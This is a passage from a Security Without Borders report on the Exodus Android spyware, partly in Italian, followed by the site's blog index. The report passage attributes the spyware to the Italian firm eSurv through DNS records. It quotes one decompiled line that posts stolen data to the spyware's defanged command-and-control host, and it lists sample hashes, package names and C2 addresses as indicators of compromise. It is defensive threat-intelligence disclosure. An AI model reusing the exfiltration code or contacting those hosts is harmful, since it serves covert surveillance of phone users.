<span class="n">Response</span> <span class="n">execute</span> <span class="o">=</span> <span class="n">build</span><span class="o">.</span><span class="na">newCall</span><span class="o">(</span><span class="k">new</span> <span class="n">Request</span><span class="o">.</span><span class="na">Builder</span><span class="o">().</span><span class="na">url</span><span class="o">(</span><span class="s">"https://ws.my-local-weather[.]com/7e661733-e332-429a-a7e2-23649f27690f/"</span> <span class="o">+</span> <span class="n">str2</span> <span class="o">+</span> <span class="s">".php"</span><span class="o">).</span><span class="na">post</span><span class="o">(</span><span class="n">RequestBody</span><span class="o">.</span><span class="na">create</span><span class="o">(</span><span class="n">a</span><span class="o">,</span> <span class="n">bArr</span><span class="o">)).</span><span class="na">build</span><span class="o">()).</span><span class="na">execute</span><span class="o">();</span>
</code></pre></div> <p>Per confermare ulteriormente la connessione dello spyware Exodus con eSurv, il dominio <code>attiva.exodus.esurv.it</code> si risolve al dominio IP 212.47.242.236 che, secondo i dati di passive DNS pubblici, nel 2017 Ã¨ stato utilizzato per ospitare il dominio <code>server1cs.exodus.connexxa.it</code>. Connexxa era una societÃ  anchessa di Catanzaro. Secondo informazioni disponibili pubblicamente, il fondatore di Connexxa sembra essere anche il CEO di eSurv.</p> <p>Ã interessante notare che abbiamo trovato altri record DNS, per lo piÃ¹ del 2017, che seguono uno schema simile e sembrano contenere <a href="http://www.comuni-italiani.it/province.html">codici a due lettere</a> per cittÃ  d&#39;Italia:</p> <table><thead> <tr> <th>Server</th> <th>City</th> </tr> </thead><tbody> <tr> <td>server1<strong>bo</strong>.exodus.connexxa[.]it</td> <td>Bologna</td> </tr> <tr> <td>server1<strong>bs</strong>.exodus.connexxa[.]it</td> <td>Brescia</td> </tr> <tr> <td>server1<strong>cs</strong>.exodus.connexxa[.]it</td> <td>Cosenza</td> </tr> <tr> <td>server1<strong>ct</strong>.exodus.connexxa[.]it</td> <td>Catania</td> </tr> <tr> <td>server1fermo.exodus.connexxa[.]it</td> <td></td> </tr> <tr> <td>server1<strong>fi</strong>.exodus.connexxa[.]it</td> <td>Firenze</td> </tr> <tr> <td>server1gioiat.exodus.connexxa[.]it</td> <td></td> </tr> <tr> <td>server1<strong>na</strong>.exodus.connexxa[.]it</td> <td>Napoli</td> </tr> <tr> <td>server1<strong>rc</strong>.exodus.connexxa[.]it</td> <td>Reggio Calabria</td> </tr> <tr> <td>server2<strong>ct</strong>.exodus.connexxa[.]it</td> <td>Catania</td> </tr> <tr> <td>server2<strong>cz</strong>.exodus.connexxa[.]it</td> <td>Catanzaro</td> </tr> <tr> <td>server2<strong>fi</strong>.exodus.connexxa[.]it</td> <td>Firenze</td> </tr> <tr> <td>server2<strong>mi</strong>.exodus.connexxa[.]it</td> <td>Milano</td> </tr> <tr> <td>server2<strong>rc</strong>.exodus.connexxa[.]it</td> <td>Reggio Calabria</td> </tr> <tr> <td>server3<strong>bo</strong>.exodus.connexxa[.]it</td> <td>Bologna</td> </tr> <tr> <td>server3<strong>ct</strong>.exodus.connexxa[.]it</td> <td>Catania</td> </tr> <tr> <td>server3.exodus.connexxa[.]it</td> <td></td> </tr> <tr> <td>server3<strong>fi</strong>.exodus.connexxa[.]it</td> <td>Firenze</td> </tr> <tr> <td>server4<strong>fi</strong>.exodus.connexxa[.]it</td> <td>Firenze</td> </tr> <tr> <td>serverrt.exodus.connexxa[.]it</td> <td></td> </tr> </tbody></table> <h3>Un Curriculum Vitae Pubblico Conferma Lo Sviluppo di un Agente per Android</h3> <p>Inoltre, un dipendente di eSurv ha descritto con molta precisione il proprio lavoro nello sviluppo di un &quot;<em>agente per raccogliere dati da dispositivi Android e inviarli a un server C&amp;C</em>&quot; e nella ricerca di &quot;<em>vulnerabilitÃ  nei dispositivi mobili (principalmente Android)</em>&quot; in un curriculum vitae disponibile pubblicamente. Ulteriori dettagli in esso riflettono altre caratteristiche di Exodus (come il bypass dei power manager che abbiamo descritto da <em>Exodus One</em>, e altro ancora):</p> <p><img src="/images/esurv/resume.png" class="rounded-lg shadow-lg"/></p> <h2>Indicators of Compromise</h2> <h4>Exodus One</h4> <p>011b6bcebd543d4eb227e840f04e188fb01f2335b0b81684b60e6b45388d3820<br> 0f5f1409b1ebbee4aa837d20479732e11399d37f05b47b5359dc53a4001314e5<br> 2055584625d24687bd027a63bc0b8faa7d1a854a535de74afba24840a52b1d2f<br> 26fef238028ee4b5b8da631c77bfb44ada3d5db8129c45dea5df6a51c9ea5f55<br> 33a9da16d096426c82f150e39fc4f9172677885cfeaedcff10c86414e88be802<br> 34d000ee1e36efd10eb37e2b79d69249d5a85682a61390a89a1b9391c46bf2ba<br> 4f6146956b50ae3a6e80a1c1f771dba848ba677064eb0e166df5804ac2766898<br> 5db49122d866967295874ab2c1ce23a7cde50212ff044bbea1da9b49bb9bc149<br> 70e2eea5609c6954c61f2e5e0a3aea832d0643df93d18d7d78b6f9444dcceef0<br> 80810a8ec9624f317f832ac2e212dba033212258285344661e5da11b0d9f0b62<br> 8453ce501fee1ca8a321f16b09969c517f92a24b058ac5b54549eabd58bf1884<br> a37f5d2418c5f2f64d06ba28fe62edee1293a56158ddfa9f04020e316054363f<br> db59407f72666526fca23d31e3b4c5df86f25eff178e17221219216c6975c63f<br> e0acbb0d7e55fb67e550a6bf5cf5c499a9960eaf5f037b785f9004585202593b </p> <h4>Exodus One Package Names</h4> <p>com.phonecarrier.linecheck<br> rm.rf<br> operatore.italia<br> it.offertetelefonicheperte<br> it.servizipremium<br> assistenza.sim<br> assistenza.linea.riattiva<br> assistenza.linea<br> it.promofferte </p> <h4>Exodus Two</h4> <p>64c11fdb317d6b7c9930e639f55863df592f23f3c7c861ddd97048891a90c64b<br> a42a05bf9b412cd84ea92b166d790e8e72f1d01764f93b05ace62237fbabe40e </p> <h4>Exodus Two ELF Utilities</h4> <p>00c787c0c0bc26caf623e66373a5aaa1b913b9caee1f34580bdfdd21954b7cc4<br> 11499ff2418f4523344de81a447f6786fdba4982057d4114f64db929990b4b59<br> 13ec6cec511297ac3137cf7d6e4a7c4f5dd2b24478a06262a44f13a3d61070b6<br> 3c9f08b3280851f54414dfa5a57f40d3b7be7b73736fa0ba21b078e75ce54d33<br> 3ee3a973c62ba5bd9eab595a7c94b7a26827c5fa5b21964d511ab58903929ec5<br> 47449a612697ad99a6fbd6e02a84e957557371151f2b034a411ebb10496648c8<br> 48a7dd672931e408662d2b5e1abcd6ef00097b8ffe3814f0d2799dd6fd74bd88<br> 824ad333320cbb7873dc49e61c14f749b0e0d88723635524463f2e6f56ea133a<br> b46f282f9a1bce3798faee3212e28924730a657eb93cda3824c449868b6ee2e7<br> c228a534535b22a316a97908595a2d793d0fecabadc32846c6d1bfb08ca9a658<br> e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855<br> e3f65f84dd6c2c3a5a653a3788d78920c0321526062a6b53daaf23fa57778a5f </p> <h4>Command &amp; Controls</h4> <p>ad1.fbsba[.]com<br> ws.my-local-weather[.]com<br> 54.71.249[.]137<br> 54.69.156[.]31<br> 162.243.172[.]208<br> attiva.exodus.esurv[.]it</p> </article> </section> </main> <footer class="group is-bg-black skew skew-before"> <div class="group footer-content l-half-size l-float-right"> <div style="font-size: 28px;"><a style="font-weight: normal;" rel=license href="http://creativecommons.org/licenses/by-sa/4.0/"><i class="fab fa-creative-commons"></i> <i class="fab fa-creative-commons-by"></i> <i class="fab fa-creative-commons-sa"></i></a></div> The content of the <a xmlns:cc="http://creativecommons.org/ns#" href="https://www.securitywithoutborders.org" property="cc:attributionName" rel="cc:attributionURL">Security Without Borders</a> website is licensed under a <a rel=license href="http://creativecommons.org/licenses/by-sa/4.0/">Creative Commons Attribution-ShareAlike 4.0 International License</a>. The software distributed through this website might be licensed differently. Please refer to the respective pages and repositories. <div class=mt-6><i class="fab fa-twitter mr-2"></i> <a href="https://twitter.com/swborders">@swborders</a></div> <div><i class="fas fa-envelope mr-2"></i> info -at- securitywithoutborders.org</div> </div> </footer> </body> </html>


#####EOF#####


<!doctype html> <html lang=en> <head> <meta content="IE=edge" http-equiv=X-UA-Compatible> <meta charset=utf-8> <meta content="width=device-width,initial-scale=1.0,minimum-scale=1.0,maximum-scale=1.0,user-scalable=no" name=viewport> <link rel="shortcut icon" href="favicon.png"/> <link rel=icon type="image/ico" href="favicon.ico"/> <link rel=stylesheet href="/fonts/fontawesome/css/all.css"> <title>Security Without Borders</title> <link href="/stylesheets/site.css" rel=stylesheet /> <style>
    @font-face {
        font-family: "Roboto Slab";
        src: url("/fonts/roboto/RobotoSlab-Regular.ttf") format("truetype");
    }
    h1, h2, h3, h4 {
        font-family: "Roboto Slab", serif;
    }
    </style> </head> <body class=blog> <header class=is-text-white> <div class="group flex header-content"> <div class=logo-container> <a href="/"> <img src="/images/logo.png" alt=logo class=logo /> </a> </div> <nav class="flex-2 is-text-align-center"> <a href="/resources.html"><i class="fas fa-book"></i> Resources</a> <a href="/tools.html"><i class="fas fa-wrench"></i> Tools</a> <a href="/blog.html"><i class="fas fa-newspaper"></i> Blog</a> <a href="/donate.html"><i class="fas fa-hand-holding-heart"></i> Donate</a> </nav> </div> </header> <main class=group> <section class="group main-container is-bg-white first"> <div class="container wide-container"> <div class=row> <div class="two-thirds column"> <div class="one-third column blog-left-column"> &nbsp; </div> <div class="two-thirds column"> <h2><i class="fas fa-newspaper"></i> Blog</h2> </div> </div> </div> <div class=row> <div class="two-thirds column" id=blog-post-list-column> <div class=row> <div class="one-third column blog-left-column"> <div class=blog-thumb-image style="background-image: url('/images/keyboard.jpg');"> <div class=no-select> <span>March</span> <span class=bigger>29</span> </div> </div> </div> <div class="two-thirds column blog-post-list-item"> <h4><a href="/blog/2019/03/29/exodus.html">Exodus: New Android Spyware Made in Italy</a></h4> <div class=blog-post-summary><p><a href="https://securitywithoutborders.org/blog/2019/03/29/exodus-ita.html">Clicca qui per la versione in Italiano</a></p> <p><em>Disclaimer: this research was conducted by members and associates of Security Without Borders, independently of any other affiliation or employer.</em></p> <h2>Summary</h2> <ul> <li>We identified a new Android spyware platform we named <strong>Exodus</strong>, which is composed of two stages we call <strong>Exodus One</strong> and <strong>Exodus Two</strong>. We have collected numerous samples spanning from 2016 to early 2019.</li> <li>Instances of this spyware were found on the Google Play Store, disguised as service applications from...</li> </ul><a href="/blog/2019/03/29/exodus.html">Continue reading</a></div> </div> </div> <div class=row> <div class="one-third column blog-left-column"> <div class=blog-thumb-image style="background-image: url('/images/keyboard.jpg');"> <div class=no-select> <span>March</span> <span class=bigger>29</span> </div> </div> </div> <div class="two-thirds column blog-post-list-item"> <h4><a href="/blog/2019/03/29/exodus-ita.html">Exodus: Nuovo Spyware per Android Made in Italy</a></h4> <div class=blog-post-summary><p><a href="https://securitywithoutborders.org/blog/2019/03/29/exodus.html">Click here for the English version</a></p> <p><em>Disclaimer: questa ricerca Ã¨ stata condotta da membri e associati di Security Without Borders, indipendentemente da qualsiasi altra affiliazione o datore di lavoro.</em></p> <h2>Sommario</h2> <ul> <li>Abbiamo identificato una nuova famiglia di spyware per Android che abbiamo nominato <strong>Exodus</strong> e che si compone di due stage che identifichiamo in questo rapporto come <strong>Exodus One</strong> e <strong>Exodus Two</strong>. Abbiamo raccolto numerose copie di questo spyware, generate ed utilizzate tra il 2016 all'inizio...</li> </ul><a href="/blog/2019/03/29/exodus-ita.html">Continue reading</a></div> </div> </div> <div class=row> <div class="one-third column blog-left-column"> <div class=blog-thumb-image style="background-image: url('/images/fist.png');"> <div class=no-select> <span>September</span> <span class=bigger>27</span> </div> </div> </div> <div class="two-thirds column blog-post-list-item"> <h4><a href="/blog/2017/09/27/catalonia.html">On the ramping censorhip in Spain around the Catalan referendum</a></h4> <div class=blog-post-summary><p>On October 1st, the Catalonian government will hold a referendum on regional independence from Spain. The Spanish government maintains that the referendum is unconstitutional and has been taking aggresive measures to attempt to prevent the vote from happening. This resulted in the seizure of paper ballots, arrests of elected <a href="https://www.reuters.com/article/us-spain-politics-catalonia/spanish-police-raid-catalan-government-to-halt-banned-referendum-idUSKCN1BV0U0">Catalonian politicians</a> on charges of sedition, and the <a href="https://www.bloomberg.com/news/articles/2017-09-21/spain-hires-cruise-liner-to-house-police-in-rebel-catalonia">deployment of 16,000 police and military forces</a> in Catalonia.</p> <p>The crackdown also manifested online through an escalation...</p><a href="/blog/2017/09/27/catalonia.html">Continue reading</a></div> </div> </div> <div class=row> <div class="one-third column blog-left-column"> <div class=blog-thumb-image style="background-image: url('/images/fist.png');"> <div class=no-select> <span>July</span> <span class=bigger>25</span> </div> </div> </div> <div class="two-thirds column blog-post-list-item"> <h4><a href="/blog/2017/07/25/istanbul10.html">Turkey's Crackdown on Human Rights Defenders Must Stop: A Call to Action in Support of #Istanbul10</a></h4> <div class=blog-post-summary><p>On July 5<sup>th</sup>, ten human rights defenders, including two IT security consultants, were detained in Turkey while attending a workshop on holistic security. Those arrested are held under the accusation of <a href="https://www.amnesty.org/en/latest/campaigns/2017/07/free-rights-defenders-in-turkey/">'committing crime in the name of a terrorist organization without being a member.'</a> The allegation is baseless. Those falsely accused are representatives of <a href="http://ihd.org.tr/en/index.php/2017/07/06/human-rights-defenders-under-attack/">non-violent and well-respected organizations that focus on human rights, women's rights, and democratic participation in Turkey</a>. The training...</p><a href="/blog/2017/07/25/istanbul10.html">Continue reading</a></div> </div> </div> <div class=row> <div class="one-third column blog-left-column"> <div class=blog-thumb-image style="background-image: url('/images/newsletter.png');"> <div class=no-select> <span>June</span> <span class=bigger>02</span> </div> </div> </div> <div class="two-thirds column blog-post-list-item"> <h4><a href="/blog/2017/06/02/newsletter-6.html">Newsletter 6</a></h4> <div class=blog-post-summary><p>Welcome to the sixth newsletter from <strong>Security Without Borders</strong>. This is a somewhat regular newsletter covering recent cyber security issues, tools and events relevant for activists, dissidents, journalists and civil society at large.</p> <blockquote> <p><strong>Security Tip</strong> Do you want to use the <strong>Tor Browser</strong> but are based in a country or region where web (and VPN) traffic is heavily monitored or blocked? Download Tor via email via the <a href="https://www.torproject.org/projects/gettor">GetTor Robot</a>: send an email to <a href="gettor@torproject.org">mailto:gettor@torproject.org</a> with your operating system...</p> </blockquote><a href="/blog/2017/06/02/newsletter-6.html">Continue reading</a></div> </div> </div> <div class="one-third column blog-left-column"> &nbsp; </div> <div class="two-thirds column"> <p>Page 1 of 3</p> <p> <a href="/blog/page/2.html">Next page <i class="fas fa-angle-double-right"></i></a> </p> </div> </div> <div class="one-third column archive-menu"> <h4>Archive</h4> <h5><a class=bigger href="/blog/2019.html">2019 (2)</a></h5> <ul> <li><a href="/blog/2019/03.html">March (2)</a></li> </ul> <h5><a class=bigger href="/blog/2017.html">2017 (10)</a></h5> <ul> <li><a href="/blog/2017/09.html">September (1)</a></li> <li><a href="/blog/2017/07.html">July (1)</a></li> <li><a href="/blog/2017/06.html">June (1)</a></li> <li><a href="/blog/2017/05.html">May (3)</a></li> <li><a href="/blog/2017/04.html">April (1)</a></li> <li><a href="/blog/2017/03.html">March (1)</a></li> <li><a href="/blog/2017/02.html">February (1)</a></li> <li><a href="/blog/2017/01.html">January (1)</a></li> </ul> </div> </div> </div> </section> </main> <footer class="group is-bg-black skew skew-before"> <div class="group footer-content l-half-size l-float-right"> <div style="font-size: 28px;"><a style="font-weight: normal;" rel=license href="http://creativecommons.org/licenses/by-sa/4.0/"><i class="fab fa-creative-commons"></i> <i class="fab fa-creative-commons-by"></i> <i class="fab fa-creative-commons-sa"></i></a></div> The content of the <a xmlns:cc="http://creativecommons.org/ns#" href="https://www.securitywithoutborders.org" property="cc:attributionName" rel="cc:attributionURL">Security Without Borders</a> website is licensed under a <a rel=license href="http://creativecommons.org/licenses/by-sa/4.0/">Creative Commons Attribution-ShareAlike 4.0 International License</a>. The software distributed through this website might be licensed differently. Please refer to the respective pages and repositories. <div class=mt-6><i class="fab fa-twitter mr-2"></i> <a href="https://twitter.com/swborders">@swborders</a></div> <div><i class="fas fa-envelope mr-2"></i> info -at- securitywithoutborders.org</div> </div> </footer> </body> </html>


#####EOF#####


